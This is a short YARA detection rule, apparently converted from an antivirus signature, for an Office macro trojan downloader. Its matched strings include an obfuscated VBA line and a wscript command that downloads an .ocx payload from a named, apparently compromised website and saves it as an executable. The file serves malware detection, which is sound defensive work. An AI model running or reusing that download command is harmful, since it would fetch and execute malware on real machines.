
rule TrojanDownloader_O97M_EncDoc_D_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.D!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {70 79 76 6a 48 66 47 4e 54 20 3d 20 70 79 76 6a 48 66 47 4e 54 20 2b 20 30 2e 34 30 39 38 39 34 31 34 39 37 36 20 2a 20 53 67 6e 28 31 2e 34 38 33 30 32 30 33 34 31 39 34 20 2b 20 32 36 30 38 37 2e 39 30 33 31 34 31 35 37 34 32 20 2a 20 4f 61 58 76 62 4a 4a 39 49 37 6e 29 } //1 pyvjHfGNT = pyvjHfGNT + 0.40989414976 * Sgn(1.48302034194 + 26087.9031415742 * OaXvbJJ9I7n)
		$a_01_1 = {28 22 77 73 63 72 69 70 74 20 2f 2f 6e 6f 6c 6f 67 6f 20 63 3a 5c 77 69 6e 6c 6f 67 73 5c 64 65 62 75 67 2e 76 62 73 20 68 74 74 70 73 3a 2f 2f 61 6e 67 65 6c 2e 61 63 2e 6e 7a 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 32 30 31 39 2f 31 30 2f 54 48 45 42 52 4b 4d 5a 2e 6f 63 78 20 63 3a 5c 77 69 6e 6c 6f 67 73 5c 6f 6c 79 5f 64 65 62 75 67 32 2e 65 78 65 22 29 } //1 ("wscript //nologo c:\winlogs\debug.vbs https://angel.ac.nz/wp-content/uploads/2019/10/THEBRKMZ.ocx c:\winlogs\oly_debug2.exe")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}